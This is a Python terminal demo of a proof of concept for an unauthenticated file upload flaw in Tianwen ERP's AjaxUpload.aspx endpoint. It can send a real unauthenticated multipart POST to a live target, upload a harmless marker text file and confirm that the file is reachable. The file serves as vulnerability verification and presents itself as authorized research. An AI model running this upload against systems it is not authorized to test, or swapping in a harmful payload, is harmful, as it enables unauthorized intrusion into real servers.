#!/usr/bin/env python3
"""
Tianwen ERP - Unauthenticated File Upload (TUI demo)
====================================================
Interactive terminal walkthrough of the /HM/M_Main/AjaxUpload.aspx upload
primitive. Runs as a self-contained demo, or against a live target with
--url. Authorized research only.
"""

import argparse
import secrets
import sys
import time

import requests

from rich.console import Console, Group
from rich.live import Live
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

from poc import (
    UPLOAD_ENDPOINT,
    MARKER_BODY,
    build_multipart_body,
    extract_upload_paths,
)

PHASES = [
    ("Enumerating module layout", "Map /HM/M_Main/ endpoints and upload directory"),
    ("Forging multipart body", "Boundary + UpFileData field + benign marker payload"),
    ("Uploading marker file", "POST {endpoint} without authentication"),
    ("Parsing response", "Extract stored file path echoed by the server"),
    ("Verifying reachability", "GET marker URL and match the PoC banner"),
]

SPINNER = "|/-\\"


class Demo:
    def __init__(self, url: str, real: bool):
        self.base = url.rstrip("/")
        self.upload_url = self.base + UPLOAD_ENDPOINT
        self.real = real
        self.filename = "secpoc_" + secrets.token_hex(4) + ".txt"
        self.marker_url = None
        self.returned_path = None
        self.status = "Pending"
        self.phase = 0
        self.done = False
        self.error = None

    # per-phase wall-clock durations (seconds)
    def phase_duration(self, i: int) -> float:
        return (0.9, 0.9, 1.2, 0.7, 0.9)[i]

    def advance(self, now: float, start: float):
        """Non-blocking state machine, called once per frame."""
        if self.done:
            return

        elapsed = now - start
        phase_index = 0
        acc = 0.0
        for i in range(len(PHASES)):
            acc += self.phase_duration(i)
            if elapsed < acc:
                phase_index = i
                break
        else:
            phase_index = len(PHASES)

        # phases 1-2 are local prep; advance the cursor immediately when
        # their wall-clock time elapses
        if phase_index <= 2:
            self.phase = phase_index
            return

        # PHASE 3: upload (fires once)
        if phase_index == 3 and self.phase < 3:
            self.phase = 3
            boundary = "----TianwenPoC" + secrets.token_hex(8)
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            }
            if self.real:
                try:
                    resp = requests.post(
                        self.upload_url,
                        headers=headers,
                        data=build_multipart_body(boundary, self.filename, MARKER_BODY),
                        timeout=15,
                        verify=False,
                    )
                except requests.exceptions.RequestException as exc:
                    self.status = "Unreachable"
                    self.error = str(exc)
                    self.done = True
                    return
            else:
                resp = _FakeResponse(200, f"/HM/M_Main/UploadFiles/{self.filename}\n")
            self._pending_resp = resp
            return

        # PHASE 4: parse
        if phase_index == 4 and self.phase < 4:
            self.phase = 4
            resp = self._pending_resp
            self.returned_path = None
            for p in extract_upload_paths(resp.text):
                if p.endswith(".txt"):
                    self.returned_path = p
                    break
            if self.returned_path is None:
                self.status = "Not vulnerable"
                self.done = True
                return
            self.marker_url = self.base + "/" + self.returned_path.lstrip("/")
            return

        # PHASE 5: verify (fires once)
        if phase_index == 5 and self.phase < 5:
            self.phase = 5
            ok = False
            if self.real:
                try:
                    check = requests.get(self.marker_url, timeout=15, verify=False)
                    ok = check.status_code == 200 and "Tianwen-ERP-Unauth-Upload-PoC" in check.text
                except requests.exceptions.RequestException:
                    ok = False
            else:
                ok = True
            self.status = "Vulnerable" if ok else "Unverified"
            self.done = True


class _FakeResponse:
    def __init__(self, status, text):
        self.status_code = status
        self.text = text


def build_view(demo: Demo, tick: int) -> Group:
    spinner = SPINNER[tick % len(SPINNER)]

    header = Panel(
        Text(
            "Tianwen Property ERP  |  /HM/M_Main/AjaxUpload.aspx  |  CWE-434",
            style="bold white",
        ),
        title=" UNAUTH FILE UPLOAD - DEMO ",
        border_style="blue",
    )

    target = Table.grid(padding=(0, 1))
    target.add_column(style="bold cyan")
    target.add_column()
    target.add_row("Target", demo.base)
    target.add_row("Endpoint", demo.upload_url)
    target.add_row("Filename", demo.filename)
    target_panel = Panel(target, title=" Target ", border_style="cyan")

    phases = Table(show_header=True, header_style="bold magenta", box=None)
    phases.add_column("#", width=3)
    phases.add_column("Phase", width=30)
    phases.add_column("Detail", width=56)
    phases.add_column("State", width=12)

    for i, (title, detail) in enumerate(PHASES):
        detail = detail.format(endpoint=demo.upload_url)
        if demo.done or i < demo.phase:
            state = "[green]DONE[/]"
        elif i == demo.phase:
            state = f"[bold yellow]{spinner} RUN[/]"
        else:
            state = "[dim]WAIT[/]"
        phases.add_row(str(i + 1), title, detail, state)

    phases_panel = Panel(phases, title=" Execution ", border_style="magenta")

    result = Table.grid(padding=(0, 1))
    result.add_column(style="bold cyan")
    result.add_column()
    result.add_row("Status", f"[bold {'red' if demo.status in ('Not vulnerable','Unreachable') else 'green'}]{demo.status}[/]")
    result.add_row("Returned path", demo.returned_path or "-")
    result.add_row("Marker URL", demo.marker_url or "-")

    footer = []
    if demo.done and demo.marker_url:
        footer.append(Text(f"  marker -> {demo.marker_url}", style="dim"))
        footer.append(Text("  remove the marker from the server after testing", style="dim yellow"))
    elif demo.error:
        footer.append(Text(f"  {demo.error}", style="bold red"))
    footer.append(Text("  authorized security research only", style="dim"))

    result_panel = Panel(result, title=" Result ", border_style="green")

    return Group(header, target_panel, phases_panel, result_panel, Group(*footer))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", help="Live target base URL (real upload; default is a simulated demo)")
    parser.add_argument("--timeout", type=float, default=20.0, help="Demo timeout in seconds")
    args = parser.parse_args()

    requests.packages.urllib3.disable_warnings()
    console = Console()

    url = args.url or "http://192.0.2.10"
    demo = Demo(url, real=bool(args.url))

    tick = 0
    start = time.monotonic()
    try:
        with Live(build_view(demo, tick), console=console, refresh_per_second=12, screen=True):
            while not demo.done:
                demo.advance(time.monotonic(), start)
                tick += 1
                time.sleep(0.05)
            # final repaint after completion
            time.sleep(0.6)
    except KeyboardInterrupt:
        console.print("[yellow]interrupted[/]")
        return 1

    console.print(build_view(demo, tick))
    return 0


if __name__ == "__main__":
    sys.exit(main())
